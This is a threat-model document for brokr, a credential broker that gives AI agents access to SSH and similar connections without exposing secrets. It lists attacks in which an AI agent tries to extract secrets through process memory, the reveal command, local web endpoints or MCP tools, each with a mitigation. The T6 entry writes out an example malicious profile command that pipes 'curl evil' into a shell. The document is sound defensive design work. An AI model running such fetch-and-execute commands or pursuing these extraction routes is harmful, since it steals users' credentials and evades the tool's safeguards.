# Threat Model

## T1: AI agent extracts secrets from memory

- **Attack**: AI reads `brokr` process memory to extract decrypted secrets (or root dumps core / uses `process_vm_readv`).
- **Mitigation (Unix, saved records)**: The long-lived parent **does not** call `decrypt_for_exec` for `exec`. A short-lived `brokr --internal-injector` child loads the vault record, decrypts once, writes the password + `\r` to the PTY master fd, then exits. Parent memory still holds ciphertext and metadata only. `SecretString` / `SecretBytes` continue to zeroize on drop; Linux additionally attempts `mlockall`, clears dumpable, disables core files, and refuses startup when `TracerPid != 0` (release / enforce mode). macOS disables core dumps and calls `PT_DENY_ATTACH` (traced-state sysctl is not wired through `libc` here).
- **Mitigation (tests / `in_proc_inject`)**: `PtyCredential::Secret` keeps the previous in-process path for integration tests and optional builds (`in_proc_inject` is **on by default**; use `cargo build --no-default-features` to drop it).
- **Residual risk**: Root-level memory dumps can still capture plaintext **inside the injector child** for milliseconds. Parent process no longer retains decrypted vault passwords for the whole SSH session.

## T2: AI calls `brokr reveal` programmatically

- **Attack**: AI tries to call `brokr reveal` to get plaintext.
- **Mitigation**: `reveal` requires `stdin_is_real_tty()` + passphrase. AI processes typically lack a real TTY.
- **Residual risk**: None (if TTY check is reliable).

## T3: Attacker reads vault file from disk

- **Attack**: Attacker copies `~/.brokr/vault/store.jsonl.enc`.
- **Mitigation**: Field payloads are encrypted with AES-256-GCM. DEK is wrapped with `master_kek` (OS keyring on Linux; file-backed `~/.brokr/.master_kek` on macOS by default) and `reveal_kek` (Argon2id). Attacker needs vault file + KEK material + reveal passphrase (when set).
- **Residual risk**: **Plaintext metadata** in each JSONL line is not inside the ciphertext: `profile`, `name`, `labels`, `host_alias`, `saved_args`, timestamps, etc. A disk thief learns connection targets and replay argv without decrypting fields. On macOS, stealing `~/.brokr/.master_kek` alone enables `exec` (not `reveal` if a reveal passphrase was set).

## T4: Tempfile race condition

- **Attack**: Attacker reads tempfile between creation and spawn.
- **Mitigation**: Tempfiles are created in `~/.brokr/run/` (0700), chmod 0600, and unlinked immediately after spawn. Subprocess retains fd.
- **Residual risk**: On multi-user systems with shared `/tmp` (not used by brokr) there would be risk; brokr uses `~/.brokr/run/`.

## T5: Ephemeral ssh-agent残留

- **Attack**: `ssh-agent` survives brokr crash; next process reuses socket.
- **Mitigation**: Socket path includes UUID + parent PID. Startup scrubs stale sockets. Linux uses `prctl(PR_SET_PDEATHSIG)`.
- **Residual risk**: `SIGKILL` of parent prevents cleanup; scrub on startup mitigates.

## T6: Malicious profile executes arbitrary commands

- **Attack**: User loads a profile with `binary = "/bin/sh -c 'curl evil | sh'"`.
- **Status (0.1.x)**: Custom TOML profiles under `~/.brokr/profiles/` are **not loaded yet** (roadmap). Built-in connectors resolve binaries via `which` only.
- **Planned mitigation**: Binary path validation (no shell metacharacters), TTY trust on first load, profile files mode 0600.
- **Residual risk**: User can invoke arbitrary binaries via `brokr exec` today; treat saved `saved_args` metadata as sensitive.

## T7: Audit log tampering

- **Attack**: Attacker modifies `~/.brokr/audit/audit.log`.
- **Mitigation**: HMAC chain keyed like `master_kek`. New events use **HMAC v2** (canonical JSON over `name`, redacted args, hardening, injector fields). Legacy v1 events (timestamp/action/profile/exit only) still verify. `brokr audit verify` detects broken chains or bad MACs.
- **Residual risk**: Attacker with `audit_hmac_key` can forge plausible lines. Upgrade from pre-v2 logs: back up or truncate `audit.log` if you need uniform v2 semantics.

## T8: Secret leakage via audit log

- **Attack**: Audit log accidentally contains plaintext secrets.
- **Mitigation**: All CLI arguments written to the audit log are replaced with `<REDACTED>` (uniform redaction, not heuristic). `reveal` never logs field values; `rm` logs `rm/success` or `rm/denied` only.
- **Residual risk**: Metadata (`profile`, `name`, `host_alias`) remains visible by design.

## T9: Cross-platform downgrade

- **Attack**: Windows version has weaker security guarantees than Unix.
- **Mitigation**: Windows uses Credential Manager + ACL-only-current-user + FILE_FLAG_DELETE_ON_CLOSE. Experimental features are clearly marked.
- **Residual risk**: SSH agent bridge on Windows depends on OpenSSH-Win32 and may not fully match Unix security.

## T10: Local manage web UI

- **Attack**: Malicious site or AI agent calls `http://127.0.0.1:<port>/reveal` or CSRF-writes credentials.
- **Mitigation**: No reveal/export endpoint; passwords never appear in HTTP responses. Server binds loopback only. Write APIs require `Authorization: Bearer <session_token>`. Delete/rotate require reveal passphrase verification; literal `YES` is accepted only when `reveal_protected == false` (auto-saved records). Embedded MCP manage omits session tokens from stderr; idle timeout marks the session expired (auth rejected). Standalone `brokr manage` prints the full URL only to a human terminal.
- **Residual risk**: Browser extensions or local malware on the same host can attempt localhost requests while `brokr manage` is running and the session is active. `brokr reveal` remains TTY-gated (T2) and is not exposed via HTTP.

## T11: MCP server exposes secrets to AI

- **Attack**: AI calls MCP tools to list passwords, export session tokens, or invoke `reveal`.
- **Mitigation**: MCP exposes only `brokr_list` (metadata), `brokr_exec` (subprocess with piped I/O), and `brokr_setup` (opens browser; tool response contains no session token). `reveal` and `rm` are not MCP tools. Embedded manage omits tokens from logs; `@techinone/brokr` npm launcher redacts `?t=` on stderr. Idle manage sessions expire (auth rejected) without killing MCP.
- **Residual risk**: `brokr_exec` stdout/stderr may contain remote command output chosen by the agent; that is intentional. First-time unsaved connections still require human TTY via manage UI, not MCP.

## Future Work

- **Custom TOML profiles**: Load `~/.brokr/profiles/*.toml` with path validation and TTY trust (see README roadmap).
- **HostBook v2**: DRY host configuration for 50+ homogeneous hosts.
- **Agent token**: Short-lived tokens for CI/CD integration.
